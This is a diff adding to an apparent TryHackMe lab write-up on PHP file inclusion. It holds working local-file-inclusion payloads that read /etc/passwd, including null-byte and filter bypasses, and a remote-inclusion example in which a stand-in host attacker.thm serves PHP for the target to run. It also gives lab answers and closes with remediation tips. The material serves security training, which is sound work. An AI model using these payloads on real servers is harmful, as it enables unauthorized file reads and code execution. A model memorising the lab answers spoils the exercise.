@@ -174,7 +174,7 @@ In this case, it works because there isn't a directory specified in the include 
 
 <h3>Question 1: Give Lab #1 a try to read /etc/passwd. What would the request URI be</h3>
 
-Answer:`//lab1.php?file=/etc/passwd`
+Answer:`/lab1.php?file=/etc/passwd`
 
 <h3>Question 2: In Lab #2, what is the directory specified in the include function?</h3>
 
@@ -193,3 +193,173 @@ Answer: `Includes`
 A couple of techniques to bypass the filter within the include function.
 
 1.  In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.
+
+- Injecting a NULL BYTE at the end of the payload helps the include function disregard characters after it, allowing you to execute code like include("languages/../../../../../etc/passwd%00").".php");, which is equivalent to include("languages/../../../../../etc/passwd").
+
+- Insert into the browser address bar.
+
+NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
+
+Question 1: Give Lab #3 a try to read /etc/passwd. What is the request look like?
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/PnaPhRJ.png" height="90%" width="90%" alt=""/>
+<br />
+
+Answer: `/lab3.php?file=../../../../etc/passwd%00` 
+
+<h2></h2>
+
+2. In this section, the developer filtered keywords to protect sensitive data in the /etc/passwd file. Two possible bypass methods exist: utilizing NullByte %00 or the current directory trick ("/..") after the filtered keyword. These can be used to exploit the system, for example, by accessing
+- `http://webapp.thm/index.php?lang=/etc/passwd/.`
+- `http://webapp.thm/index.php?lang=/etc/passwd%00.`
+
+<h2></h2>
+
+- Using "cd .." in a file system moves you up one directory level.
+- "cd ." keeps you in the current directory, making no change.
+- In a file path like "/etc/passwd/..", ".." moves one level up to the parent directory.
+- In a file path like "/etc/passwd/.", "." refers to the current directory, so it remains unchanged.
+- Understanding the use of "." and ".." is essential for navigating and referencing directories in a file system.
+
+<h2></h2>
+
+Question 2: Which function is causing the directory traversal in Lab #4?
+
+- If we put in `/etc/passwd/.`. We would get into the passwd file content.
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/m24AjUN.png" height="90%" width="90%" alt=""/>
+<br />
+
+- To get what function is causing the directory traversal in Lab 4, we can just put in random things on the bar like "THM".
+  - It will show that "file_get_contents" is the function at the warning.
+ 
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/qb0Y5NK.png" height="90%" width="90%" alt=""/>
+<br />
+
+Answer: `file_get_contents`
+
+<h2></h2>
+
+3.  the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!
+
+`http://webapp.thm/index.php?lang=../../../../etc/passwd`
+
+We got the following error!
+
+Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
+
+- The web application replaces "../" with an empty string, making it difficult to perform directory traversal attacks.
+- To bypass this protection, you can use a payload like "....//....//....//....//....//etc/passwd."
+- This works because the PHP filter replaces only the first occurrence of "../" and doesn't perform a second pass, allowing the payload to succeed in directory traversal.
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/FA4ghgZ.png" height="90%" width="90%" alt=""/>
+<br />
+
+- If we put in `../../../../etc/passwd`. It will become `include(includes/etc/passwd)`.
+- If we put in `....//..../..../.../etc/passwd`. It will become `nclude(includes/../../.././etc/passwd)`.
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/3X0t7IW.png" height="90%" width="90%" alt=""/>
+<br />
+
+<h2></h2>
+
+4. Discuss the case where the developer forces the include to read from a defined directory!
+
+- When a web application requires directory input, such as in the URL `http://webapp.thm/index.php?lang=languages/EN.php`, you can manipulate the input for potential exploitation.
+- To exploit this, include the directory in your payload by modifying the parameter, e.g., `?lang=languages/../../../../../etc/passwd`.
+- Using relative directory traversal techniques, like "../" sequences, can help you access sensitive files or directories on the server.
+
+It's crucial to be cautious and ethical when testing for vulnerabilities in web applications, as unauthorized access or manipulation can be illegal and unethical.
+
+<h2></h2>
+
+Question 3: Try out Lab #6 and check what is the directory that has to be in the input field?
+
+- When we put in random input in the File Name bar like "THM".
+  - It said Access Denied! Allowed files at "THM-profile" folder only!
+ 
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/mSnKgQg.png" height="90%" width="90%" alt=""/>
+<br />
+
+Answer: `THM-profile`
+
+<h2></h2>
+
+Question 4: Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?
+
+- When we put in `THM-profile/../../../../etc/os-release`
+  - We can get the Version ID.
+ 
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/erzuZfz.png" height="90%" width="90%" alt=""/>
+<br />
+
+Answer: `12.04`
+
+
+<h2></h2>
+
+# Remote File Inclusion - RFI
+
+- Remote File Inclusion (RFI) involves including remote files in a vulnerable application by exploiting improper input sanitization.
+- RFI, like LFI, relies on a lack of input validation and requires the `allow_url_fopen` option to be enabled.
+- RFI poses a higher risk than LFI because it can lead to Remote Command Execution (RCE) on the server.
+- Consequences of a successful RFI attack include:
+  - Sensitive Information Disclosure
+  - Cross-site Scripting (XSS)
+  - Denial of Service (DoS)
+ 
+<h2></h2>
+
+- RFI attack requires external server communication with the application server.
+- Attacker hosts malicious files on their server.
+- Malicious file is injected into the include function using HTTP requests.
+- Content of the malicious file executes on the vulnerable application server.
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/FDzQm6L.png" height="90%" width="90%" alt=""/>
+<br />
+
+<h2></h2>
+
+<h3>RFI Steps</h3>
+
+- Let's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt`
+- `cmd.txt` contains a printing message `Hello THM`.
+  - `<?PHP echo "Hello THM"; ?>`
+ 
+- First, the attacker injects the malicious URL.
+  - `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
+  - If there is no input validation, then the malicious URL passes into the include function.
+- Next, the web app server will send a `GET` request to the malicious server to fetch the file.
+- As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.
+- In our case, the current page somewhere has to show the Hello THM message.
+
+
+<h2></h2>
+
+# Remediation
+
+As a developer, it's crucial to understand web app vulnerabilities, how to detect them, and ways to prevent them. For file inclusion vulnerabilities, common prevention tips include:
+
+- Keep system and services updated with the latest versions.
+- Disable PHP errors to prevent information leakage.
+- Consider using a Web Application Firewall (WAF) for enhanced security.
+- Disable unnecessary PHP features like allow_url_fopen and allow_url_include.
+- Carefully control protocols and PHP wrappers in your web application.
+- Always implement thorough input validation to prevent file inclusion vulnerabilities.
+- Use whitelisting for file names and locations and consider blacklisting where necessary.
